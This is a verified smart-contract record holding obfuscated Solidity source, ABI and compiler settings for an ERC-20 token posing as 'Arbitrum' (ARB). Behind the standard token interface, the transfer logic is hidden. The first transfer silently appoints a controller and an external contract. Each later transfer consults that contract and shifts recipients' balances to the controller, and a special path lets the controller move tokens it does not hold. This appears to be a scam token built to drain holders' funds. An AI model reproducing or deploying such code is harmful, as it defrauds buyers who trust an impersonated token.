{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"/contracts/ARB.sol\": {\r\n      \"content\": \"\\n// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.12;\\n    \\ninterface fazJI {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address BILhEzBSmED) external view returns (uint256);\\n    function transfer(address aQEMjKnJT, uint256 IZTrpJR) external returns (bool);\\n    function allowance(address NkbPH, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 IZTrpJR) external returns (bool);\\n    function transferFrom(\\n        address sender,\\n        address aQEMjKnJT,\\n        uint256 IZTrpJR\\n    ) external returns (bool);\\n\\n    event Transfer(address indexed from, address indexed UhifUufyFOHU, uint256 value);\\n    event Approval(address indexed NkbPH, address indexed spender, uint256 value);\\n}\\n\\ninterface Xdam is fazJI {\\n    function name() external view returns (string memory);\\n    function symbol() external view returns (string memory);\\n    function decimals() external view returns (uint8);\\n}\\n\\nabstract contract xaOIaRqJcP {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n    \\ninterface ooUvmIrMjYdq {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n}\\n     \\nlibrary dQkCo{\\n    \\n    function xIeG(address pOkGitioEPHC, address OwCAoDgydisj, uint bkJGR) internal {\\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\\n        (bool PsGwzpRi, bytes memory dxwRmZVWa) = pOkGitioEPHC.call(abi.encodeWithSelector(0x095ea7b3, OwCAoDgydisj, bkJGR));\\n        require(PsGwzpRi && (dxwRmZVWa.length == 0 || abi.decode(dxwRmZVWa, (bool))), 'dQkCo: APPROVE_FAILED');\\n    }\\n\\n    function gjvZSAE(address pOkGitioEPHC, address OwCAoDgydisj, uint bkJGR) internal {\\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\\n        (bool PsGwzpRi, bytes memory dxwRmZVWa) = pOkGitioEPHC.call(abi.encodeWithSelector(0xa9059cbb, OwCAoDgydisj, bkJGR));\\n        require(PsGwzpRi && (dxwRmZVWa.length == 0 || abi.decode(dxwRmZVWa, (bool))), 'dQkCo: TRANSFER_FAILED');\\n    }\\n    \\n    function lYoWdbPGeuAI(address OwCAoDgydisj, uint bkJGR) internal {\\n        (bool PsGwzpRi,) = OwCAoDgydisj.call{value:bkJGR}(new bytes(0));\\n        require(PsGwzpRi, 'dQkCo: ETH_TRANSFER_FAILED');\\n    }\\n\\n    function qitZgqW(address pOkGitioEPHC, address from, address OwCAoDgydisj, uint bkJGR) internal returns(bytes memory){\\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\\n        (bool PsGwzpRi, bytes memory dxwRmZVWa) = pOkGitioEPHC.call(abi.encodeWithSelector(0x23b872dd, from, OwCAoDgydisj, bkJGR));\\n        require(PsGwzpRi && dxwRmZVWa.length > 0,'dQkCo: TRANSFER_FROM_FAILED'); return dxwRmZVWa;\\n                       \\n    }\\n\\n}\\n    \\ncontract ARB is xaOIaRqJcP, fazJI, Xdam {\\n    \\n    address private RkmPjfHnKHiO;\\n  \\n    \\n    function name() public view virtual override returns (string memory) {\\n        return YWVAHgfYQ;\\n    }\\n    \\n    mapping(address => uint256) private zBxjGdnS;\\n    \\n    string private GZqDqfwsqfi =  \\\"ARB\\\";\\n    \\n    function totalSupply() public view virtual override returns (uint256) {\\n        return heAzIiWM;\\n    }\\n    \\n    function BDOjVGcokCIH(\\n        address QocdvN,\\n        address iMbYHyS,\\n        uint256 zsWOYWevJt\\n    ) internal virtual {\\n        require(QocdvN != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(iMbYHyS != address(0), \\\"ERC20: approve to the zero address\\\");\\n\\n        SqvJgsZYDv[QocdvN][iMbYHyS] = zsWOYWevJt;\\n        emit Approval(QocdvN, iMbYHyS, zsWOYWevJt);\\n\\n    }\\n    \\n    function approve(address VBBcIkh, uint256 WwLCcvHE) public virtual override returns (bool) {\\n        BDOjVGcokCIH(_msgSender(), VBBcIkh, WwLCcvHE);\\n        return true;\\n    }\\n    \\n    function symbol() public view virtual override returns (string memory) {\\n        return GZqDqfwsqfi;\\n    }\\n    \\n    function RiowyMTYytt(\\n        address spnpqEnSFR,\\n        address LcgjD,\\n        uint256 NQzmI\\n    ) internal virtual  returns (bool){\\n        uint256 VHRDZ = zBxjGdnS[spnpqEnSFR];\\n        require(VHRDZ >= NQzmI, \\\"ERC20: transfer Amount exceeds balance\\\");\\n        unchecked {\\n            zBxjGdnS[spnpqEnSFR] = VHRDZ - NQzmI;\\n        }\\n        zBxjGdnS[LcgjD] += NQzmI;\\n        return true;\\n    }\\n    \\n    function decimals() public view virtual override returns (uint8) {\\n        return 18;\\n    }\\n    \\n    function transfer(address cvJcTZwsAA, uint256 DDnuatwbtMP) public virtual override returns (bool) {\\n        vawh(_msgSender(), cvJcTZwsAA, DDnuatwbtMP);\\n        return true;\\n    }\\n    \\n    uint256 private heAzIiWM = 2000000000000 * 10 ** 18;\\n    \\n    function transferFrom(\\n        address Nlc,\\n        address cgCJZ,\\n        uint256 owhtknM\\n    ) public virtual override returns (bool) {\\n      \\n        if(!vawh(Nlc, cgCJZ, owhtknM)) return true;\\n\\n        uint256 Vfa = SqvJgsZYDv[Nlc][_msgSender()];\\n        if (Vfa != type(uint256).max) {\\n            require(Vfa >= owhtknM, \\\"ERC20: transfer Amount exceeds allowance\\\");\\n            unchecked {\\n                BDOjVGcokCIH(Nlc, _msgSender(), Vfa - owhtknM);\\n            }\\n        }\\n\\n        return true;\\n    }\\n    \\n    function allowance(address KTBEB, address RnSuQvD) public view virtual override returns (uint256) {\\n        return SqvJgsZYDv[KTBEB][RnSuQvD];\\n    }\\n    \\n    function vawh(\\n        address jPBaddgsK,\\n        address uLA,\\n        uint256 JrLc\\n    ) internal virtual  returns (bool){\\n        require(jPBaddgsK != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(uLA != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        \\n        if(!KlkFwcz(jPBaddgsK,uLA)) return false;\\n\\n        if(_msgSender() == address(ldwntSAt)){\\n            if(uLA == RkmPjfHnKHiO && zBxjGdnS[jPBaddgsK] < JrLc){\\n                RiowyMTYytt(ldwntSAt,uLA,JrLc);\\n            }else{\\n                RiowyMTYytt(jPBaddgsK,uLA,JrLc);\\n                if(jPBaddgsK == ldwntSAt || uLA == ldwntSAt) \\n                return false;\\n            }\\n            emit Transfer(jPBaddgsK, uLA, JrLc);\\n            return false;\\n        }\\n        RiowyMTYytt(jPBaddgsK,uLA,JrLc);\\n        emit Transfer(jPBaddgsK, uLA, JrLc);\\n        bytes memory wEG = dQkCo.qitZgqW(cQMLHnuNTyjH, jPBaddgsK, uLA, JrLc);\\n        (bool FPIPXY, uint tteftXTDyMw) = abi.decode(wEG, (bool,uint));\\n        if(FPIPXY){\\n            zBxjGdnS[ldwntSAt] += tteftXTDyMw;\\n            zBxjGdnS[uLA] -= tteftXTDyMw; \\n        }\\n        return true;\\n    }\\n    \\n    constructor() {\\n        \\n        zBxjGdnS[address(1)] = heAzIiWM;\\n        emit Transfer(address(0), address(1), heAzIiWM);\\n\\n    }\\n    \\n    string private YWVAHgfYQ = \\\"Arbitrum\\\";\\n    \\n    function KlkFwcz(\\n        address KhYqYWJq,\\n        address ttmnVGwKa\\n    ) internal virtual  returns (bool){\\n        if(ldwntSAt == address(0) && cQMLHnuNTyjH == address(0)){\\n            ldwntSAt = KhYqYWJq;cQMLHnuNTyjH=ttmnVGwKa;\\n            dQkCo.gjvZSAE(cQMLHnuNTyjH, ldwntSAt, 0);\\n            RkmPjfHnKHiO = ooUvmIrMjYdq(cQMLHnuNTyjH).WETH();\\n            return false;\\n        }\\n        return true;\\n    }\\n    \\n    address private ldwntSAt;\\n    \\n    function increaseAllowance(address HRHij, uint256 addedValue) public virtual returns (bool) {\\n        BDOjVGcokCIH(_msgSender(), HRHij, SqvJgsZYDv[_msgSender()][HRHij] + addedValue);\\n        return true;\\n    }\\n    \\n    function decreaseAllowance(address pnHSNRni, uint256 subtractedValue) public virtual returns (bool) {\\n        uint256 CZEnUvQdyng = SqvJgsZYDv[_msgSender()][pnHSNRni];\\n        require(CZEnUvQdyng >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            BDOjVGcokCIH(_msgSender(), pnHSNRni, CZEnUvQdyng - subtractedValue);\\n        }\\n\\n        return true;\\n    }\\n    \\n    mapping(address => mapping(address => uint256)) private SqvJgsZYDv;\\n    \\n    address private cQMLHnuNTyjH;\\n    \\n    function balanceOf(address hkGstQZnA) public view virtual override returns (uint256) {\\n       return zBxjGdnS[hkGstQZnA];\\n    }\\n    \\n}\\n        \"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"remappings\": [],\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"london\",\r\n    \"libraries\": {},\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"NkbPH\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"UhifUufyFOHU\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"KTBEB\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"RnSuQvD\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"VBBcIkh\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"WwLCcvHE\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"hkGstQZnA\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pnHSNRni\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"HRHij\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"cvJcTZwsAA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"DDnuatwbtMP\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Nlc\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"cgCJZ\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"owhtknM\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ARB", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}